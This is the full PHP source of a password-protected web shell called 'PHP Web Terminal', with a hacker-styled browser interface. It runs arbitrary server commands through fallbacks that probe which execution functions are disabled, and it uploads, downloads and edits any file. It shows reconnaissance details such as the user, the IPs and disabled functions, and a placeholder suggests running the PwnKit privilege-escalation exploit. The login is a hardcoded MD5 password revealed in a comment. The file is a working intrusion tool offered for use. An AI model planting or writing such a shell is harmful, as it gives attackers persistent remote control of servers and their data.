<?php
/**
 * PHP Web Terminal
 *
 * @version 1.2.3
 * @pv.pat [Original Author] - Updated by @pinoyvendetta
 * @link https://github.com/pinoyvendetta/php-web-terminal
 *
 * Enhanced for PHP 5.3+, 7.x, and 8.x compatibility,
 * and verified for Windows and Linux servers.
 */

// --- Basic Setup ---
session_start();
date_default_timezone_set('Asia/Manila');
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/term_error_log');
error_reporting(E_ALL);
ini_set('display_errors', 0); // Keep this off for security
set_time_limit(0); // Allow script to run indefinitely for long tasks
ob_implicit_flush(); // Ensure output is sent immediately

// --- Version Information ---
$version = '1.2.3';

// --- System Detection ---
$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

// --- MD5 Password ---
$default_password_hash = '2ebba5cd75576c408240e57110e7b4ff'; // MD5 for "myp@ssw0rd"

// --- Function Utilities ---
function is_function_enabled($func) {
    if (!function_exists($func)) return false;
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array($func, array_map('trim', $disabled));
}

// --- Legacy Command Execution (for short commands) ---
function execute_command($command, $cwd) {
    global $is_windows;
    $full_command = $is_windows
        ? 'cd /d ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1'
        : 'cd ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1';

    $output = '';

    // Chain of command execution fallbacks for maximum compatibility
    if (is_function_enabled('shell_exec')) {
        $output = shell_exec($full_command);
    } elseif (is_function_enabled('proc_open')) {
        // Changed to array() for PHP 5.3 compatibility
        $descriptorspec = array(
            array("pipe", "r"),
            array("pipe", "w"),
            array("pipe", "w")
        );
        $pipes = array(); // Changed to array() for PHP 5.3 compatibility
        $process = proc_open($full_command, $descriptorspec, $pipes, $cwd);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output .= stream_get_contents($pipes[1]); fclose($pipes[1]);
            $output .= stream_get_contents($pipes[2]); fclose($pipes[2]);
            proc_close($process);
        } else { $output = "Error: proc_open failed."; }
    } elseif (is_function_enabled('passthru')) {
        ob_start();
        passthru($full_command, $return_var);
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (is_function_enabled('system')) {
        ob_start();
        system($full_command, $return_var);
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (is_function_enabled('exec')) {
        exec($full_command, $output_array, $return_var);
        $output = implode("\n", $output_array);
    } else {
        $output = "Error: All suitable command execution functions are disabled.";
    }
    return htmlspecialchars($output ?: "Command executed, but produced no output.", ENT_QUOTES, 'UTF-8');
}


// --- Request Handling ---
$login_error = '';
$upload_message = '';

// Handle Logout
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Check Login Status
$is_logged_in = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

// Handle Login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (md5($_POST['password']) === $default_password_hash) {
        $_SESSION['authenticated'] = true;
        $is_logged_in = true;
        $_SESSION['cwd'] = getcwd();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Invalid password.';
    }
}

// --- AJAX Endpoint Logic ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
    // Replaced null coalescing operator (??) with ternary for PHP 5.3 compatibility
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    // == STREAMING COMMAND HANDLER (GENERALIZED REAL-TIME FIX) ==
    if ($action === 'stream') {
        // Essential headers for streaming
        header('Content-Type: text/plain; charset=utf-8');
        header('X-Content-Type-Options: nosniff');
        
        // Disable GZIP and output buffering
        if (function_exists('apache_setenv')) { @apache_setenv('no-gzip', 1); }
        @ini_set('zlib.output_compression', 0);
        @ini_set('output_buffering', 'off');

        $command = trim($_POST['command']);
        $custom_shell = isset($_POST['custom_shell']) ? trim($_POST['custom_shell']) : '';
        $cwd = $_SESSION['cwd'];

        $exec_command = !empty($custom_shell) ? $custom_shell . ' ' . $command : $command;

        // --- NEW UNBUFFERING LOGIC ---
        // General solution for script buffering.
        // It prepends the correct flags to the interpreter to force unbuffered output.
        if (preg_match('/^(php)\s+(.*)/i', $command, $matches)) {
            // For PHP scripts, disable output_buffering.
            $exec_command = 'php -d output_buffering=Off -d zlib.output_compression=Off ' . $matches[2];
        } elseif (preg_match('/^(python[23]?)\s+(.*)/i', $command, $matches)) {
            // For Python scripts, use the unbuffered flag.
            $exec_command = $matches[1] . ' -u ' . $matches[2];
        } elseif (preg_match('/^(perl)\s+(.*)/i', $command, $matches) && !$is_windows) {
            // For Perl on Linux, stdbuf is a good option.
             $exec_command = '/usr/bin/stdbuf -i0 -o0 -e0 ' . $command;
        }
        // For other commands on Linux, use stdbuf as a fallback.
        elseif (!$is_windows && is_executable('/usr/bin/stdbuf')) {
            $exec_command = '/usr/bin/stdbuf -i0 -o0 -e0 ' . $exec_command;
        }
        
        $full_command = $is_windows
            ? 'cd /d ' . escapeshellarg($cwd) . ' && ' . $exec_command
            : 'cd ' . escapeshellarg($cwd) . ' && ' . $exec_command;
        
        // Changed to array() for PHP 5.3 compatibility
        $descriptorspec = array(
           0 => array("pipe", "r"), // stdin
           1 => array("pipe", "w"), // stdout
           2 => array("pipe", "w")  // stderr
        );
        $pipes = array(); // Changed to array() for PHP 5.3 compatibility
        $process = proc_open($full_command, $descriptorspec, $pipes, $cwd);

        if (is_resource($process)) {
            $status = proc_get_status($process);
            
            $pid_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'phpt-pid-' . session_id();
            file_put_contents($pid_file, $status['pid']);
            session_write_close();

            fclose($pipes[0]);

            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);

            while (true) {
                $status = proc_get_status($process);
                if (connection_aborted()) {
                    if ($status['running']) {
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        if ($is_windows) {
                            exec("taskkill /F /T /PID " . $status['pid'] . " > nul 2>&1");
                        } else {
                            exec("pkill -P " . $status['pid'] . "; kill -9 " . $status['pid'] . " > /dev/null 2>&1");
                        }
                        proc_close($process);
                    }
                    if(file_exists($pid_file)) unlink($pid_file);
                    exit();
                }

                // Changed to array() for PHP 5.3 compatibility
                $read = array($pipes[1], $pipes[2]);
                $write = null;
                $except = null;
                
                if (stream_select($read, $write, $except, 0, 50000) > 0) { // 0.05 second timeout
                    foreach($read as $stream) {
                        $output = fread($stream, 8192);
                        if ($output !== false && strlen($output) > 0) {
                            echo $output;
                            @flush();
                        }
                    }
                }

                if (!$status['running']) {
                    break;
                }
            }
            
            echo stream_get_contents($pipes[1]);
            echo stream_get_contents($pipes[2]);

            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            if (file_exists($pid_file)) {
                unlink($pid_file);
            }
        } else {
            echo "Error: Failed to execute command using proc_open.";
            @flush();
        }
        exit;
    }
    
    // == ABORT COMMAND HANDLER ==
    if ($action === 'abort') {
        header('Content-Type: application/json');
        session_write_close();

        $pid_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'phpt-pid-' . session_id();

        if (file_exists($pid_file)) {
            $pid = (int)file_get_contents($pid_file);
            unlink($pid_file);

            if ($pid > 0) {
                if ($is_windows) {
                    exec("taskkill /F /T /PID $pid > nul 2>&1");
                } else {
                    exec("pkill -P $pid; kill -9 $pid > /dev/null 2>&1");
                }
                echo json_encode(array('status' => 'aborted', 'pid' => $pid)); // Changed to array()
            } else {
                echo json_encode(array('status' => 'error', 'message' => 'Invalid PID found.')); // Changed to array()
            }
        } else {
            echo json_encode(array('status' => 'error', 'message' => 'No running process found.')); // Changed to array()
        }
        exit;
    }
    
    // == LEGACY & FILE OPERATIONS HANDLER ==
    if ($action === 'save_file' || isset($_POST['command'])) {
        header('Content-Type: application/json');
        // Changed to array() for PHP 5.3 compatibility
        $response = array('output' => '', 'cwd' => $_SESSION['cwd']);
        
        if ($action === 'save_file') {
            if (file_put_contents($_POST['filepath'], $_POST['content']) !== false) {
                $response['output'] = htmlspecialchars("File saved: " . $_POST['filepath']);
            } else {
                $response['output'] = htmlspecialchars("Error: Failed to save file to " . $_POST['filepath']);
            }
        } else {
            // This part handles cd, edit, download commands
            $command = trim($_POST['command']);
            putenv('TERM=xterm');

            if (preg_match('/^\s*cd\s*(.*)/i', $command, $matches)) {
                $target_dir_param = trim($matches[1]);
                $target_dir_to_resolve = $target_dir_param;
                if (empty($target_dir_param) || $target_dir_param === '~') {
                    $target_dir_to_resolve = getenv('HOME') ?: getenv('USERPROFILE');
                }
                $original_php_cwd = getcwd();
                if (@chdir($_SESSION['cwd'])) {
                    $new_dir = realpath($target_dir_to_resolve);
                    @chdir($original_php_cwd);
                } else { $new_dir = false; }

                if ($new_dir && is_dir($new_dir) && is_readable($new_dir)) {
                    $_SESSION['cwd'] = $new_dir;
                    $response['output'] = htmlspecialchars("Changed directory to $new_dir");
                } else {
                    $response['output'] = htmlspecialchars("Error: Cannot change directory to '$target_dir_param'.");
                }
            } elseif (preg_match('/^\s*edit\s+([\S]+)/i', $command, $matches)) {
                $file_to_edit = trim($matches[1]);
                // Replaced string offset access with substr for PHP 5.3 compatibility
                $is_absolute = (substr($file_to_edit, 0, 1) === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_edit)));
                $full_path = $is_absolute ? $file_to_edit : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_edit;

                if (is_file($full_path) && is_readable($full_path)) {
                    $content = file_get_contents($full_path);
                    $response['output'] = htmlspecialchars("Editing existing file: " . $file_to_edit);
                } else {
                    $content = '';
                    $response['output'] = htmlspecialchars("Opening new or unreadable file for editing: " . $file_to_edit);
                }
                $response['action'] = 'edit';
                $response['filepath'] = $full_path;
                $response['content'] = $content;
            } elseif (preg_match('/^\s*download\s+([\S]+)/i', $command, $matches)) {
                 $file_to_download = trim($matches[1]);
                 // Replaced string offset access with substr for PHP 5.3 compatibility
                 $is_absolute = (substr($file_to_download, 0, 1) === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_download)));
                 $full_path = $is_absolute ? $file_to_download : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_download;
                 if (is_file($full_path) && is_readable($full_path)) {
                     $response['action'] = 'download';
                     $response['filepath'] = base64_encode($full_path);
                     $response['output'] = htmlspecialchars("Preparing download for " . basename($full_path) . "...");
                 } else {
                     $response['output'] = htmlspecialchars("Error: Cannot access file '$file_to_download' for download.");
                 }
            } else {
                // This 'else' should ideally not be hit if JS logic is correct, but is a fallback.
                $response['output'] = execute_command($command, $_SESSION['cwd']);
            }
        }
        $response['cwd'] = $_SESSION['cwd'];
        echo json_encode($response);
        exit;
    }
}


// Handle File Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $is_logged_in) {
    $upload_dir_target = $_SESSION['cwd'];
    if (!is_dir($upload_dir_target) || !is_writable($upload_dir_target)) {
        $upload_message = "Error: Upload directory (".htmlspecialchars($upload_dir_target).") is not writable.";
    } else {
        // basename(preg_replace(...)) sanitizes the filename correctly for all PHP versions.
        $file_name_sanitized = basename(preg_replace('/[^A-Za-z0-9.\-\_]/', '', $_FILES['file']['name']));
        if (!empty($file_name_sanitized)) {
            $target_file = rtrim($upload_dir_target, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_name_sanitized;
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
                $upload_message = "File uploaded to: " . htmlspecialchars($target_file, ENT_QUOTES, 'UTF-8');
            } else {
                $upload_message = "Error: Failed to move uploaded file. Check permissions.";
            }
        } else {
            $upload_message = "Error: Invalid file name.";
        }
    }
}

// Handle File Download (GET Request)
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download']) && $is_logged_in) {
    $full_path = base64_decode($_GET['download']);
    if ($full_path !== false && is_file($full_path) && is_readable($full_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($full_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($full_path));
        ob_clean();
        flush();
        readfile($full_path);
        exit;
    } else {
        echo "Error: File not found or access denied.";
        exit;
    }
}


// If not logged in, show login form
if (!$is_logged_in) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Terminal Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; margin: 0; padding: 20px; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
        .login-container { max-width: 400px; margin: 50px auto; text-align: center; background: #1a1a1a; padding: 20px; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00; border-radius: 5px; }
        input[type="password"] { width: 100%; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
        input[type="submit"] { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-top: 10px; }
        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .login-image-wrapper { text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>System Terminal Login</h2>
        <form method="post">
            <input type="password" name="password" placeholder="Enter password" autofocus>
            <br><br>
            <input type="submit" value="Login">
        </form>
        <?php if (!empty($login_error)) echo '<p class="error">'.$login_error.'</p>'; ?>
    </div>
    <div class="login-image-wrapper">
        <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Login GIF" width="250" height="250">
    </div>
</body>
</html>
<?php
    exit;
}

// --- Main Terminal Page ---
if ($is_logged_in && !isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
$uname = function_exists('php_uname') ? php_uname() : 'N/A';
// Replaced null coalescing operator (?:) with ternary for PHP 5.3 compatibility
$disabled_functions = ini_get('disable_functions') ? ini_get('disable_functions') : 'None';

$safe_mode = ini_get('safe_mode') ? 'On' : 'Off';
$php_version = phpversion();
// Replaced null coalescing operator (??) with ternary for PHP 5.3 compatibility
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (function_exists('gethostbyname') ? gethostbyname(gethostname()) : 'N/A');
$client_ip = $_SERVER['REMOTE_ADDR'];
$user_info = function_exists('posix_getpwuid') ? @posix_getpwuid(@posix_geteuid()) : array('name' => get_current_user()); // Changed to array()
$user = $user_info['name'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Terminal Shell v<?php echo $version; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; margin: 0; padding: 0; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
        .header { position: fixed; top: 0; left: 0; right: 0; background: #1a1a1a; padding: 10px; border-bottom: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; z-index: 1000; font-size: 12px; display: flex; justify-content: space-between; align-items: flex-start; }
        .header-col { padding: 0 10px; }
        .header-col p { margin: 3px 0; }
        .header-col.left { text-align: left; flex: 1; padding-right: 20px; }
        .header-col.right { text-align: right; flex-shrink: 0; }
        .terminal-container { margin-top: 140px; margin-left: 20px; margin-right: 20px; margin-bottom: 80px; }
        #terminal { background: #1a1a1a; border: 2px solid #00ff00; padding: 10px; height: 55vh; overflow-y: auto; margin-bottom: 10px; box-shadow: 0 0 15px #00ff00; border-radius: 5px; word-wrap: break-word; white-space: pre-wrap; }
        #terminal p { margin: 2px 0; }
        #terminal .prompt-line { display: flex; }
        #terminal .prompt-line .prompt { flex-shrink: 0; }
        .input-area { display: flex; align-items: center; }
        .prompt { color: #00ff00; text-shadow: 0 0 5px #00ff00; margin-right: 5px; white-space: nowrap; }
        #command, #custom_shell { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: inherit; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
        #command { flex-grow: 1; }
        .custom-shell-group { margin-left: 10px; display: flex; align-items: center; }
        #custom_shell { width: 150px; }
        #abortButton { margin-left: 10px; background-color: #9d0000; color: white; text-shadow: none; }
        #abortButton:hover { background-color: #ff0000; }
        .action-btn, .logout-btn { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: inherit; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-left: 10px; }
        .footer { position: fixed; bottom: 0; left: 0; right: 0; background: #1a1a1a; padding: 10px; border-top: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; text-align: center; z-index: 1000; }
        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.8); }
        .modal-content { background-color: #1a1a1a; margin: 10% auto; padding: 20px; border: 2px solid #00ff00; width: 80%; color: #00ff00; box-shadow: 0 0 25px #00ff00; }
        .modal-content textarea { width: 100%; height: 400px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Courier New', monospace; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-col left">
            <p><strong>Uname:</strong> <span style="word-break: break-all;"><?php echo htmlspecialchars($uname, ENT_QUOTES, 'UTF-8'); ?></span></p>
            <p><strong>Disabled Functions:</strong> <span style="word-break: break-all;"><?php echo htmlspecialchars($disabled_functions, ENT_QUOTES, 'UTF-8'); ?></span></p>
            <p><strong>Date and Time:</strong> <span id="live_time"><?php echo date('Y-m-d H:i:s'); ?></span></p>
            <p><strong>User:</strong> <?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>CWD:</strong> <span id="cwd_display" style="word-break: break-all;"><?php echo htmlspecialchars($_SESSION['cwd'], ENT_QUOTES, 'UTF-8'); ?></span></p>
        </div>
        <div class="header-col right">
            <form method="post" style="text-align: right; margin-bottom: 5px;"><input type="hidden" name="logout" value="1"><input type="submit" value="Logout" class="logout-btn"></form>
            <p><strong>Safe Mode:</strong> <?php echo $safe_mode; ?></p>
            <p><strong>PHP Version:</strong> <?php echo $php_version; ?></p>
            <p><strong>Server IP:</strong> <?php echo htmlspecialchars($server_ip, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>Client IP:</strong> <?php echo htmlspecialchars($client_ip, ENT_QUOTES, 'UTF-8'); ?></p>
        </div>
    </div>

    <div class="terminal-container">
        <div id="terminal"></div>
        <div class="input-area">
           <span class="prompt">$ </span>
           <input type="text" id="command" autofocus>
           <div class="custom-shell-group">
               <input type="text" id="custom_shell" placeholder="(e.g. ./Pwnkit)">
               <button id="abortButton" class="action-btn" style="display:none;">Abort Task</button>
           </div>
        </div>
    </div>

    <div class="footer">
        <form method="post" enctype="multipart/form-data" style="display: inline;">
            <input type="file" name="file" required><input type="submit" value="Upload" class="action-btn">
        </form>
        <?php if (!empty($upload_message)) echo '<p class="'.(strpos($upload_message, 'Error') === 0 ? 'error' : '').'">'.$upload_message.'</p>'; ?>
    </div>
    
    <div id="editorModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span><h3 id="editorFileName">Edit File</h3>
            <textarea id="editorContent"></textarea><button id="saveButton" class="action-btn">Save</button>
        </div>
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const commandInput = document.getElementById('command');
        const customShellInput = document.getElementById('custom_shell');
        const cwdSpan = document.getElementById('cwd_display');
        const abortButton = document.getElementById('abortButton');
        const liveTimeSpan = document.getElementById('live_time');
        
        // Editor Modal elements
        const editorModal = document.getElementById('editorModal');
        const editorFileNameSpan = document.getElementById('editorFileName');
        const editorContentTextarea = document.getElementById('editorContent');
        const saveButton = document.getElementById('saveButton');
        const closeBtn = editorModal.querySelector('.close-btn');

        let commandHistory = [];
        let historyIndex = -1;
        let isExecuting = false;
        let abortController = null;
        let currentFilePath = '';
        let currentOutputElement = null;

        // --- Live Clock ---
        setInterval(() => {
            const now = new Date();
            const year = now.getFullYear();
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const day = String(now.getDate()).padStart(2, '0');
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            liveTimeSpan.textContent = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
        }, 1000);

        commandInput.addEventListener('keydown', function(e) {
            if (isExecuting) return;
            // Enter key
            if (e.keyCode === 13) {
                e.preventDefault();
                const command = commandInput.value.trim();
                if (command !== '') {
                    appendToTerminal('$ ' + command, 'prompt');
                    commandHistory.push(command);
                    historyIndex = commandHistory.length;
                    executeCommand(command);
                    commandInput.value = '';
                }
            } 
            // Up arrow for history
            else if (e.keyCode === 38) {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    commandInput.value = commandHistory[historyIndex];
                    commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
                }
            } 
            // Down arrow for history
            else if (e.keyCode === 40) {
                 e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    commandInput.value = commandHistory[historyIndex];
                } else {
                     historyIndex = commandHistory.length;
                     commandInput.value = '';
                }
            }
        });

        function appendToTerminal(text, type = 'output') {
            const p = document.createElement('p');
            if (type === 'prompt') {
                p.innerHTML = `<span class="prompt-line"><span class="prompt">$ </span><span>${escapeHtml(text.substring(2))}</span></span>`;
            } else if (type === 'error') {
                p.style.color = '#ff0000';
                p.textContent = text;
            } else {
                p.innerHTML = text.replace(/\n/g, '<br>');
            }
            terminal.appendChild(p);
            terminal.scrollTop = terminal.scrollHeight;
            currentOutputElement = null;
        }

        function appendToTerminalStreaming(chunk) {
            if (!currentOutputElement) {
                currentOutputElement = document.createElement('p');
                terminal.appendChild(currentOutputElement);
            }
            currentOutputElement.textContent += chunk;
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function escapeHtml(text) {
            return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        }

        function toggleExecution(isStarting) {
            isExecuting = isStarting;
            commandInput.disabled = isStarting;
            abortButton.style.display = isStarting ? 'inline-block' : 'none';
        }

        function executeCommand(command) {
            if (command.toLowerCase() === 'clear') {
                terminal.innerHTML = '';
                return;
            }
            // Delegate non-streaming commands
            if (/^\s*(cd|edit|download)/i.test(command) && !/^\s*cd\s*&&/i.test(command)) {
                sendLegacyCommand(command);
            } else {
                streamCommand(command);
            }
        }
        
        async function streamCommand(command) {
            toggleExecution(true);
            abortController = new AbortController();
            const formData = new FormData();
            formData.append('action', 'stream');
            formData.append('command', command);
            formData.append('custom_shell', customShellInput.value);

            try {
                const response = await fetch('<?php echo $_SERVER['PHP_SELF']; ?>', {
                    method: 'POST',
                    body: formData,
                    signal: abortController.signal
                });

                if (!response.ok) {
                    throw new Error(`Server responded with status: ${response.status}`);
                }

                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                currentOutputElement = null; // Reset for new output

                while(true) {
                    const { value, done } = await reader.read();
                    if (done) break;
                    appendToTerminalStreaming(decoder.decode(value, { stream: true }));
                }

            } catch (err) {
                if (err.name !== 'AbortError') {
                     appendToTerminal(`Error: ${err.message}`, 'error');
                }
            } finally {
                toggleExecution(false);
            }
        }
        
        abortButton.onclick = async () => {
            if(abortController) abortController.abort();
            
            const formData = new FormData();
            formData.append('action', 'abort');

            try {
                const response = await fetch('<?php echo $_SERVER['PHP_SELF']; ?>', { method: 'POST', body: formData });
                const result = await response.json();
                if (result.status === 'aborted') {
                    appendToTerminal(`\n[Process terminated by user]`, 'error');
                } else {
                    appendToTerminal(`\n[Abort failed: ${result.message}]`, 'error');
                }
            } catch (err) {
                appendToTerminal(`\n[Abort request failed: ${err.message}]`, 'error');
            } finally {
                toggleExecution(false);
            }
        };

        function sendLegacyCommand(command) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    try {
                        const response = JSON.parse(xhr.responseText);
                        if (response.output) appendToTerminal(response.output);
                        if (response.cwd) cwdSpan.textContent = response.cwd;
                        if (response.action === 'edit') {
                            openEditor(response.filepath, response.content);
                        } else if (response.action === 'download') {
                             window.location.href = `?download=${response.filepath}`;
                        }
                    } catch (e) {
                        appendToTerminal('Error: Failed to parse server response.', 'error');
                    }
                } else {
                    appendToTerminal(`Error: Server request failed. Status: ${xhr.status}`, 'error');
                }
            };
            xhr.send('command=' + encodeURIComponent(command));
        }

        // --- Editor Modal Logic ---
        function openEditor(filepath, content) {
            currentFilePath = filepath;
            editorFileNameSpan.textContent = 'Edit: ' + filepath;
            editorContentTextarea.value = content;
            editorModal.style.display = 'block';
            editorContentTextarea.focus();
        }
        closeBtn.onclick = () => editorModal.style.display = 'none';
        window.onclick = (event) => { if (event.target == editorModal) editorModal.style.display = 'none'; };

        saveButton.onclick = function() {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    try {
                        const response = JSON.parse(xhr.responseText);
                        appendToTerminal(response.output);
                        editorModal.style.display = 'none';
                    } catch(e) { appendToTerminal('Error: Failed to parse save response.', 'error'); }
                } else { appendToTerminal(`Error: Failed to save file. Status: ${xhr.status}`, 'error'); }
            };
            const payload = `action=save_file&filepath=${encodeURIComponent(currentFilePath)}&content=${encodeURIComponent(editorContentTextarea.value)}`;
            xhr.send(payload);
        };
    </script>
</body>
</html>